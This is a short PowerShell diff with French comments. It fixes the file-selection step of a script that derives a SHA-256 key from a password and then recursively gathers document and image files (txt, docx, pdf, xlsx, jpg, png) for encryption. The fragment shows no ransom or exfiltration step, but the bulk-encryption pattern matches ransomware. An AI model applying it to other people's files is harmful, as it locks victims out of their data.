@@ -5,7 +5,7 @@ $sha = New-Object System.Security.Cryptography.SHA256Managed
 $key = $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($password))
 
 # --- CHIFFREMENT ---
-$files = Get-ChildItem $folder -File -Filter "*.txt","*.docx","*.pdf","*.xlsx","*.jpg","*.png" -Recurse
+$files = Get-ChildItem $folder -File -Include "*.txt","*.docx","*.pdf","*.xlsx","*.jpg","*.png" -Recurse
 
 foreach ($file in $files)
 {
